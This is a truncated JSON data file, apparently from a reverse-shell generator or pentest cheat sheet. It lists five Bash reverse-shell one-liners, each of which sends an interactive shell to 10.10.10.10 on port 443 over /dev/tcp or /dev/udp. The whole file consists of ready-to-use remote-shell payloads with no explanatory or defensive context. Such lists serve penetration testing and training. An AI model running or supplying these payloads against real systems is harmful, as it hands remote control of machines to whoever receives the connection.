{
    "Bash":{
        "bash -i":"bash -i >& /dev/tcp/10.10.10.10/443 0>&1",
        "bash 196":"0<&196;exec 196<>/dev/tcp/10.10.10.10/443; bash <&196 >&196 2>&196",
        "bash read line":"exec 5<>/dev/tcp/10.10.10.10/443;cat <&5 | while read line; do $line 2>&5 >&5; done",
        "bash 5":"bash -i 5<> /dev/tcp/10.10.10.10/443 0<&5 1>&5 2>&5",
        "bash udp":"bash -i >& /dev/udp/10.10.10.10/443 0>&1"
